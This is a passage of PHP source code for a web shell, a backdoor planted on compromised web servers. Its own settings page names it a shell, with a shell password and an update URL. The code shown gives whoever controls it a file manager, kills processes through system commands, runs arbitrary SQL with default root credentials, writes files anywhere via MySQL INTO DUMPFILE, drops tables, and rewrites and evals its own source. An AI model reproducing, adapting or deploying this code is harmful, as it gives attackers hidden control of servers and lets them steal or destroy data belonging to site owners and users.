                p('<tr class=' . bg() . '>');
                p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\'' . str_replace("'", "\'", getUpPath($nowpath)) . '\');">Parent Directory</a></td>');
                p('</tr>');
            }
        }
    }
    p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
    $file_i = '0';
    foreach ($filedata as $key => $filedb) {
        if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
            $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"], '', $filedb['server_link']);
            $thisbg  = bg();
            p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
            p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $filedb['server_link'] . '"></td>');
            p('<td>' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a>' : $filedb['filename']) . '</td>');
            p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');">' . $filedb['mtime'] . '</a></td>');
            p('<td nowrap>' . $filedb['size'] . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">' . $filedb['filechmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:dofile(\'downfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Download</a> | ');
            p('<a href="javascript:copyfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Copy</a> | ');
            p('<a href="javascript:opfile(\'editfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
            p('<a href="javascript:rename(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Rename</a>');
            p('</td></tr>');
            $file_i++;
        }
    }
    p('<tr class="head"><td></td><td>File Name</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
    p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
    p('</form></table>');
}elseif ($action == 'settings'){
	if (isset($setpass) && isset($setpass2)){
		if (($setpass2 == $setpass)){
			if((md5($curpass) == $pass)){
				$newv = file_get_contents(preg_replace('@\(.*\(.*$@', '', __FILE__));
				$newv = preg_replace("/\\\$pass[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."pass               = \"" . md5($setpass) ."\";",$newv);
				$fp        = @fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), 'w');
        $writingit = @fwrite($fp, $newv);
        @fclose($fp);
        if (!$writingit) {
        	$writingit = file_put_contents(preg_replace('@\(.*\(.*$@', '', __FILE__), $newv);
        }
        $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
				m('Password updated '.$writeit);
				preg_match_all("/(<\?)(.*?)(\?>)/is", $newv, $matches);
				eval("?>".$matches[0][0]."<?PHP\n");
        scookie('loginpass', $pass);
			}else{
				m('Incorrect Current Password...');
			}
		}else{
			m('New passwords don\'t mach.');
		}
	}
	if (isset($setcfuu)){
		$newv = file_get_contents(preg_replace('@\(.*\(.*$@', '', __FILE__));
		$setaep = ($setaep == 'on') ? 'true' : 'false';
		$setcfu = ($setcfu == 'on') ? 'true' : 'false';
		$sethsb = ($sethsb == 'on') ? 'true' : 'false';
		$newv = preg_replace("/\\\$adaptiveerrorpage[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."adaptiveerrorpage  = " . $setaep . ";",$newv); 
		$newv = preg_replace("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|=|\n|\r]*\;/",strrev("CFUUHERE"),$newv);
		$newv = preg_replace("/\\\$helpsupportbooter[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."helpsupportbooter  = " . $sethsb . ";",$newv); 
		$newv = preg_replace("/\\\$checkforupdates[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."checkforupdates    = " . $setcfu . ";",$newv); 
		$newv = str_replace(strrev("CFUUHERE"),"$"."checkforupdatesurl = \"" . $setcfuu . "\";",$newv);
		$fp        = @fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), 'w');
    $writingit = @fwrite($fp, $newv);
    @fclose($fp);
    if (!$writingit) {
    	$writingit = file_put_contents(preg_replace('@\(.*\(.*$@', '', __FILE__), $newv);
    }
    $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
		m('Settings updated '.$writeit);
		preg_match_all("/(<\?)(.*?)(\?>)/is", $newv, $matches);
		eval("?>".$matches[0][0]."<?PHP\n");
	}
	formhead(array(
        'title' => 'Change Shell Settings'
    ));
    $corncfu = $checkforupdates ? ' checked' : '';
    $cornaep = $adaptiveerrorpage ? ' checked' : '';
    $cornhsb = $helpsupportbooter ? ' checked' : '';
    echo '<input type="checkbox" name="setaep"' . $cornaep . '>Adaptive Error Page Active<br>';
    echo '<input type="checkbox" name="sethsb"' . $cornhsb . '>Help Support Stress Tester<br>';
    echo '<input type="checkbox" name="setcfu"' . $corncfu . '>Allow Checking for Updates<br>';
    makeinput(array(
        'title' => 'Check for Updates URL:',
        'name' => 'setcfuu',
        'value' => $checkforupdatesurl,
        'newline' => 1
    ));
    makehide('action', 'settings');
    formfooter();
	formhead(array(
        'title' => 'Change Shell Password'
    ));
    makehide('action', 'settings');
    makeinput(array(
        'title' => 'Current Password:',
        'type' => 'password',
        'name' => 'curpass',
        'value' => '',
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'New Password:',
        'type' => 'password',
        'name' => 'setpass',
        'value' => '',
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'New Password:',
        'type' => 'password',
        'name' => 'setpass2',
        'value' => '',
        'newline' => 1
    ));
    formfooter();

}elseif ($action == 'process') {
formhead(array(
    		'name' => 'killprocform'
    ));
    makehide('action');
    makehide('doing');
    makehide('pid');
    formfoot();
	p('<form id="proclist" name="proclist" action="' . $self . '" method="post">');
    makehide('doing','killproc');
	if ($doing == 'killproc') {
        if ($pid) {
            $succ   = $fail = 0;
            $allPid = array();
                if (count($pid) > 1){
           foreach ($pid as $proc) {
                array_push($allPid, $proc);
            }
          }else{
          array_push($allPid, $pid);
          }
          $counter = 0;
    foreach ($allPid as $pid) {
        $pid = trim($pid);
        if (!empty($pid)) {
            if (function_exists("posix_kill")) {
                if (posix_kill($pid, '9'))
                    $counter++;
            } else {
                if (is_win()) {
                    $cmd = execute("taskkill /F /PID " . $pid);
                    $cmd = execute("tasklist /FI \"PID eq " . $pid . "\"");
                    if (strpos($cmd, "No tasks are running") !== false)
                        $counter++;
                } else {
                    $cmd = execute("kill -9 " . $pid);
                    if ((strpos($cmd, "such process") === false) && (strpos($cmd, "not permitted") === false)) {
                        $cmd   = trim(execute("ps -p " . $pid));
                        $check = explode("\n", $cmd);
                        if (count($check) == 1)
                            $counter++;
                    }
                }
            }
        }
    }
            m('Kill process(es) has completed. The results are Total: ' . count($allPid) . ', Success: ' . $counter . ', Fail: ' . (count($allPid) - $counter));
        } else {
            m('Please select process(es)');
        }
    }
    formhead(array(
    		'name' => 'killproclist'
    ));
    makehide('action','process');
    makehide('doing','killproc');
tbhead();
p('<tr class="head"><td></td><td>User</td><td>PID</td><td>Command</td><td>%CPU</td><td>%MEM</td><td>VSZ</td><td>RSS</td><td>TT</td><td>STAT</td><td>Started</td><td>Time</td><td>Action</td></tr>');



$wcount = 11;
        if (is_win()) {
            $cmd      = "tasklist /V /FO csv";
            $wexplode = "\",\"";
        } else {
            $cmd      = "ps aux";
            $wexplode = " ";
        }
        $res = execute($cmd);
        if (trim($res) == ''){
            return "false";
       } else {
            if (!is_win()){
                $res = preg_replace('#\ +#', ' ', $res);
              }
            $psarr    = explode("\n", $res);
            $check    = explode($wexplode, $psarr[0]);
            $wcount   = count($check);
            $thisbg = "alt1";
            $proccount = 0;
            for ($i = 1; $i <= count($psarr); $i++) {
                $psa = $psarr[$i];
                if (trim($psa) != '') {
                	 p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                        if ($thisbg == "alt1"){
                        	$thisbg = "alt2";
                        }else{
                        $thisbg = "alt1";
                        }
                        $psln     = explode($wexplode, $psa, $wcount);
                        $pid      = trim(trim($psln[1]), "\"");
            p('<td width="2%" nowrap><input name="pid[]" type="checkbox" value="' . $pid. '"></td>');
                        p('<td>' . $psln[0] . '</td>');
                        p('<td>' . $pid . '</td>');
                        p('<td>' . $psln[10] . '</td>');
                        p('<td>' . $psln[2] . '</td>');
                        p('<td>' . $psln[3] . '</td>');
                        p('<td>' . $psln[4] . '</td>');
                        $proccount++;
                        p('<td>' . $psln[5] . '</td>');
                        p('<td>' . $psln[6] . '</td>');
                        p('<td>' . $psln[7] . '</td>');
                        p('<td>' . $psln[8] . '</td>');
                        p('<td>' . $psln[9] . '</td>');
                        p('<td><a href="javascript:killproc(\'' . $pid . '\');">Kill</a></td>');
                        $output .= "</tr>";
                }
            }
        }



p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="11"><a href="javascript:killprocm(\'killproc\');">Kill selected</a></td><td align="right">' . $proccount . ' process(es)</td></tr>');
p('</table></form>');
formfoot();
} elseif ($action == 'sqlfile') {
    if ($doing == "mysqlupload") {
        $file     = $_FILES['uploadfile'];
        $filename = $file['tmp_name'];
        if (file_exists($savepath)) {
            m('The goal file has already existed');
        } else {
            if (!$filename) {
                m('Please choose a file');
            } else {
                $fp       = @fopen($filename, 'r');
                $contents = @fread($fp, filesize($filename));
                @fclose($fp);
                $contents = bin2hex($contents);
                if (!$upname)
                    $upname = $file['name'];
                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                $result    = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                m($result ? 'Upload success' : 'Upload has failed: ' . mysql_error());
            }
        }
    }
    ;
    echo '<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$(\'doing\').value=doing;
	$(\'mysqlfile\').dbhost.value=$(\'dbinfo\').dbhost.value;
	$(\'mysqlfile\').dbport.value=$(\'dbinfo\').dbport.value;
	$(\'mysqlfile\').dbuser.value=$(\'dbinfo\').dbuser.value;
	$(\'mysqlfile\').dbpass.value=$(\'dbinfo\').dbpass.value;
	$(\'mysqlfile\').dbname.value=$(\'dbinfo\').dbname.value;
	$(\'mysqlfile\').charset.value=$(\'dbinfo\').charset.value;
	$(\'mysqlfile\').submit();
}
</script>
';
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    formhead(array(
        'title' => 'MySQL Information',
        'name' => 'dbinfo'
    ));
    makehide('action', 'sqlfile');
    p('<p>');
    p('DBHost:');
    makeinput(array(
        'name' => 'dbhost',
        'size' => 20,
        'value' => $dbhost
    ));
    p(':');
    makeinput(array(
        'name' => 'dbport',
        'size' => 4,
        'value' => $dbport
    ));
    p('DBUser:');
    makeinput(array(
        'name' => 'dbuser',
        'size' => 15,
        'value' => $dbuser
    ));
    p('DBPass:');
    makeinput(array(
        'name' => 'dbpass',
        'size' => 15,
        'value' => $dbpass,
        'type' => 'password'
    ));
    p('DBName:');
    makeinput(array(
        'name' => 'dbname',
        'size' => 15,
        'value' => $dbname
    ));
    p('DBCharset:');
    makeselect(array(
        'name' => 'charset',
        'option' => $charsetdb,
        'selected' => $charset,
        'nokey' => 1
    ));
    p('</p>');
    formfoot();
    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
    p('<h2>Upload file</h2>');
    p('<p><b>This operation the DB user must has FILE privilege</b></p>');
    p('<p>Save path(fullpath): <input onmouseover="this.focus();" class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
    p('<h2>Download file</h2>');
    p('<p>File: <input onmouseover="this.focus();" class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
    makehide('dbhost');
    makehide('dbport');
    makehide('dbuser');
    makehide('dbpass');
    makehide('dbname');
    makehide('charset');
    makehide('doing');
    makehide('action', 'sqlfile');
    p('</form>');
} elseif ($action == 'mysqladmin') {
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
    if (isset($dbhost)) {
        $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
    }
    if (isset($dbuser)) {
        $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
    }
    if (isset($dbpass)) {
        $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
    }
    if (isset($dbport)) {
        $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
    }
    if (isset($dbname)) {
        $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
    }
    if (isset($charset)) {
        $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
    }
    if ($doing == 'backupmysql' && $saveasfile) {
        if (!$table) {
            m('Please choose the table');
        } else {
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            $fp        = @fopen($path, 'w');
            if ($fp) {
                foreach ($table as $k => $v) {
                    if ($v) {
                        sqldumptable($v, $fp);
                    }
                }
                fclose($fp);
                $fileurl = str_replace(SA_ROOT, '', $path);
                m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
                mysql_close();
            } else {
                m('Backup failed');
            }
        }
    }
    if ($insert && $insertsql) {
        $keystr = $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            if ($val) {
                $keystr .= $tmp . $key;
                $valstr .= $tmp . "'" . addslashes($val) . "'";
                $tmp = ',';
            }
        }
        if ($keystr && $valstr) {
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("INSERT INTO `$tablename` ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
        }
    }
    if ($update && $insertsql && $base64) {
        $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            $valstr .= $tmp . $key . "='" . addslashes($val) . "'";
            $tmp = ',';
        }
        if ($valstr) {
            $where     = base64_decode($base64);
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("UPDATE `$tablename` SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
        }
    }
    if ($doing == 'del' && $base64) {
        $where      = base64_decode($base64);
        $delete_sql = "DELETE FROM `$tablename` WHERE $where";
        $mysqllink  = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        m(q("DELETE FROM `$tablename` WHERE $where") ? 'Deletion record of success' : mysql_error());
    }
    if ($tablename && $doing == 'drop') {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (q("DROP TABLE `$tablename`")) {
            m('Drop table of success');
            $tablename = '';
        } else {
            m(mysql_error());
        }
    }
    formhead(array(
        'title' => 'MySQL Manager'
    ));
    makehide('action', 'mysqladmin');
    p('<p>');
    p('DBHost:');
    makeinput(array(
        'name' => 'dbhost',
        'size' => 20,
        'value' => $dbhost
    ));
    p(':');
    makeinput(array(
        'name' => 'dbport',
        'size' => 4,
        'value' => $dbport
    ));
    p('DBUser:');
    makeinput(array(
        'name' => 'dbuser',
        'size' => 15,
        'value' => $dbuser
    ));
    p('DBPass:');
    makeinput(array(
        'name' => 'dbpass',
        'size' => 15,
        'value' => $dbpass,
        'type' => 'password'
    ));
    p('DBCharset:');
    makeselect(array(
        'name' => 'charset',
        'option' => $charsetdb,
        'selected' => $charset,
        'nokey' => 1
    ));
    makeinput(array(
        'name' => 'connect',
        'value' => 'Connect',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
    formhead(array(
        'name' => 'recordlist'
    ));
    makehide('doing');
    makehide('action', 'mysqladmin');
    makehide('base64');
    makehide('tablename');
    p($dbform);
    formfoot();
    formhead(array(
        'name' => 'setdbname'
    ));
    makehide('action', 'mysqladmin');
    p($dbform);
    if (!$dbname) {
        makehide('dbname');
    }
    formfoot();
    formhead(array(
        'name' => 'settable'
    ));
    makehide('action', 'mysqladmin');
    p($dbform);
    makehide('tablename');
    makehide('page', $page);
    makehide('doing');
    formfoot();
    $cachetables = array();
    $pagenum     = 30;
    $page        = intval($page);
    if ($page) {
        $start_limit = ($page - 1) * $pagenum;
    } else {
        $start_limit = 0;
        $page        = 1;
    }
    if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        $mysqlver  = mysql_get_server_info();
        p('<p>MySQL ' . $mysqlver . ' running in ' . $dbhost . ' as ' . $dbuser . '@' . $dbhost . '</p>');
        $highver = $mysqlver > '4.1' ? 1 : 0;
        $query   = q("SHOW DATABASES");
        $dbs     = array();
        $dbs[]   = '-- Select a database --';
        while ($db = mysql_fetch_array($query)) {
            $dbs[$db['Database']] = $db['Database'];
        }
        makeselect(array(
            'title' => 'Please select a database:',
            'name' => 'db[]',
            'option' => $dbs,
            'selected' => $dbname,
            'onchange' => 'moddbname(this.options[this.selectedIndex].value)',
            'newline' => 1
        ));
        $tabledb = array();
        if ($dbname) {
            p('<p>');
            p('Current dababase: <a href="javascript:moddbname(\'' . str_replace("'", "\'", $dbname) . '\');">' . $dbname . '</a>');
            if ($tablename) {
                p(' | Current Table: <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\');">' . $tablename . '</a> [ <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'drop\');">Drop</a> ]');
            }
            p('</p>');
            mysql_select_db($dbname);
            $getnumsql = '';
            $runquery  = 0;
            if ($sql_query) {
                $runquery = 1;
            }
            $allowedit = 0;
            if ($tablename && !$sql_query) {
                $sql_query = "SELECT * FROM `$tablename`";
                $getnumsql = $sql_query;
                $sql_query = $sql_query . " LIMIT $start_limit, $pagenum";
                $allowedit = 1;
            }
            p('<form action="' . $self . '" method="POST">');
            p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database ' . $dbname . ':</td></tr><tr><td><textarea onmouseover="this.focus();" name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($sql_query, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
            makehide('tablename', $tablename);
            makehide('action', 'mysqladmin');
            p($dbform);
            p('</form>');
            if ($tablename || ($runquery && $sql_query)) {
                if ($doing == 'structure') {
                    $result = q("SHOW FULL COLUMNS FROM `$tablename`");
                    $rowdb  = array();
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('<h3>Structure</h3>');
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    p('<tr class="head">');
                    p('<td>Field</td>');
                    p('<td>Type</td>');
                    p('<td>Collation</td>');
                    p('<td>Null</td>');
                    p('<td>Key</td>');
                    p('<td>Default</td>');
                    p('<td>Extra</td>');
                    p('<td>Privileges</td>');
                    p('<td>Comment</td>');
                    p('</tr>');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                        p('<td>' . $row['Field'] . '</td>');
                        p('<td>' . $row['Type'] . '</td>');
                        p('<td>' . $row['Collation'] . ' </td>');
                        p('<td>' . $row['Null'] . ' </td>');
                        p('<td>' . $row['Key'] . ' </td>');
                        p('<td>' . $row['Default'] . ' </td>');
                        p('<td>' . $row['Extra'] . ' </td>');
                        p('<td>' . $row['Privileges'] . ' </td>');
                        p('<td>' . $row['Comment'] . ' </td>');
                        p('</tr>');
                    }
                    tbfoot();
                    $result = q("SHOW INDEX FROM `$tablename`");
                    $rowdb  = array();
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('<h3>Indexes</h3>');
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    p('<tr class="head">');
                    p('<td>Keyname</td>');
                    p('<td>Type</td>');
                    p('<td>Unique</td>');
                    p('<td>Packed</td>');
                    p('<td>Seq_in_index</td>');
                    p('<td>Field</td>');
                    p('<td>Cardinality</td>');
                    p('<td>Collation</td>');
                    p('<td>Null</td>');
                    p('<td>Comment</td>');
                    p('</tr>');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                        p('<td>' . $row['Key_name'] . '</td>');
                        p('<td>' . $row['Index_type'] . '</td>');
                        p('<td>' . ($row['Non_unique'] ? 'No' : 'Yes') . ' </td>');
                        p('<td>' . ($row['Packed'] === null ? 'No' : $row['Packed']) . ' </td>');
                        p('<td>' . $row['Seq_in_index'] . '</td>');
                        p('<td>' . $row['Column_name'] . ($row['Sub_part'] ? '(' . $row['Sub_part'] . ')' : '') . ' </td>');
                        p('<td>' . ($row['Cardinality'] ? $row['Cardinality'] : 0) . ' </td>');
                        p('<td>' . $row['Collation'] . ' </td>');
                        p('<td>' . $row['Null'] . ' </td>');
                        p('<td>' . $row['Comment'] . ' </td>');
                        p('</tr>');
                    }
                    tbfoot();
                } elseif ($doing == 'insert' || $doing == 'edit') {
                    $result = q('SHOW COLUMNS FROM `' . $tablename . '`');
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    $rs = array();
                    if ($doing == 'insert') {
                        p('<h2>Insert new line in ' . $tablename . ' table</h2>');
                    } else {
                        p('<h2>Update record in ' . $tablename . ' table</h2>');
                        $where  = base64_decode($base64);
                        $result = q("SELECT * FROM `$tablename` WHERE $where LIMIT 1");
                        $rs     = mysql_fetch_array($result);
                    }
                    p('<form method="post" action="' . $self . '">');
                    p($dbform);
                    makehide('action', 'mysqladmin');
                    makehide('tablename', $tablename);
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    foreach ($rowdb as $row) {
                        if ($rs[$row['Field']]) {
                            $value = htmlspecialchars($rs[$row['Field']]);
                        } else {
                            $value = '';
                        }
                        $thisbg = bg();
                        p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                        if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
                            p('<td><b>' . $row['Field'] . '</b><br />' . $row['Type'] . '</td><td>' . $value . ' </td></tr>');
                        } else {
                            p('<td><b>' . $row['Field'] . '</b><br />' . $row['Type'] . '</td><td><textarea onmouseover="this.focus();" class="area" name="insertsql[' . $row['Field'] . ']" style="width:500px;height:60px;overflow:auto;">' . $value . '</textarea></td></tr>');
                        }
                    }
                    if ($doing == 'insert') {
                        p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                    } else {
                        p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                        makehide('base64', $base64);
                    }
                    p('</table></form>');
                } else {
                    $querys = @explode(';', $sql_query);
                    foreach ($querys as $num => $query) {
                        if ($query) {
                            p("<p><b>Query#{$num} : " . htmlspecialchars($query, ENT_QUOTES) . "</b></p>");
                            switch (qy($query)) {
                                case 0:
                                    p('<h2>Error : ' . mysql_error() . '</h2>');
                                    break;
                                case 1:
                                    if (strtolower(substr($query, 0, 13)) == 'select * from') {
                                        $allowedit = 1;
                                    }
                                    if ($getnumsql) {
                                        $tatol     = mysql_num_rows(q($getnumsql));
                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
                                    }
                                    if (!$tablename) {
                                        $sql_line = str_replace(array(
                                            "\r",
                                            "\n",
                                            "\t"
                                        ), array(
                                            ' ',
                                            ' ',
                                            ' '
                                        ), trim(htmlspecialchars($query)));
                                        $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                        preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i", $sql_line, $matches);
                                        $tablename = $matches[1][0];
                                    }
                                    $getfield = q("SHOW COLUMNS FROM `$tablename`");
                                    $rowdb    = array();
                                    $keyfied  = '';
                                    while ($row = @mysql_fetch_assoc($getfield)) {
                                        $rowdb[$row['Field']]['Key']   = $row['Key'];
                                        $rowdb[$row['Field']]['Extra'] = $row['Extra'];
                                        if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
                                            $keyfied = $row['Field'];
                                        }
                                    }
                                    if ($keyfied && strtolower(substr($query, 0, 13)) == 'select * from') {
                                        $query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
                                    }
                                    $result = q($query);
                                    p($multipage);
                                    p('<table border="0" cellpadding="3" cellspacing="0">');
                                    p('<tr class="head">');
                                    if ($allowedit)
                                        p('<td>Action</td>');
                                    $fieldnum = @mysql_num_fields($result);
                                    for ($i = 0; $i < $fieldnum; $i++) {
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len  = @mysql_field_len($result, $i);
                                        p("<td nowrap>$name<br><span>$type($len)" . (($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '') . ($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '') . "</span></td>");
                                    }
                                    p('</tr>');
                                    while ($mn = @mysql_fetch_assoc($result)) {
                                        $thisbg = bg();
                                        p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                                        $where = $tmp = $b1 = '';
                                        foreach ($mn as $key => $inside) {
                                            if ($inside) {
                                                if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
                                                    $where = $key . "='" . addslashes($inside) . "'";
                                                    break;
                                                }
                                                $where .= $tmp . $key . "='" . addslashes($inside) . "'";
                                                $tmp = ' AND ';
                                            }
                                        }
                                        foreach ($mn as $key => $inside) {
                                            $b1 .= '<td nowrap>' . html_clean($inside) . ' </td>';
                                        }
                                        $where = base64_encode($where);
                                        if ($allowedit)
                                            p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $where . '\', \'' . $tablename . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $where . '\', \'' . $tablename . '\');">Del</a></td>');
                                        p($b1);
                                        p('</tr>');
                                        unset($b1);
                                    }
                                    p('<tr class="head">');
                                    if ($allowedit)
                                        p('<td>Action</td>');
                                    $fieldnum = @mysql_num_fields($result);
                                    for ($i = 0; $i < $fieldnum; $i++) {
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len  = @mysql_field_len($result, $i);
                                        p("<td nowrap>$name<br><span>$type($len)" . (($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '') . ($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '') . "</span></td>");
                                    }
                                    p('</tr>');
                                    tbfoot();
                                    p($multipage);
                                    break;
                                case 2:
                                    $ar = mysql_affected_rows();
                                    p('<h2>affected rows : <b>' . $ar . '</b></h2>');
                                    break;
                            }
                        }
                    }
                }
            } else {
                $query     = q("SHOW TABLE STATUS");
                $table_num = $table_rows = $data_size = 0;
                $tabledb   = array();
                while ($table = mysql_fetch_array($query)) {
                    $data_size            = $data_size + $table['Data_length'];
                    $table_rows           = $table_rows + $table['Rows'];
                    $table['Data_length'] = sizecount($table['Data_length']);
                    $table_num++;
                    $tabledb[] = $table;
                }
                $data_size = sizecount($data_size);
                unset($table);
                p('<table border="0" cellpadding="0" cellspacing="0">');
                p('<form action="' . $self . '" method="POST">');
                makehide('action', 'mysqladmin');
                p($dbform);
                p('<tr class="head">');
                p('<td width="2%" align="center"></td>');
                p('<td>Name</td>');
                p('<td>Rows</td>');
                p('<td>Data_length</td>');
                p('<td>Create_time</td>');
                p('<td>Update_time</td>');
                if ($highver) {
                    p('<td>Engine</td>');
                    p('<td>Collation</td>');
                }
                p('<td>Operate</td>');
                p('</tr>');
                foreach ($tabledb as $key => $table) {
                    $thisbg = bg();
                    p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
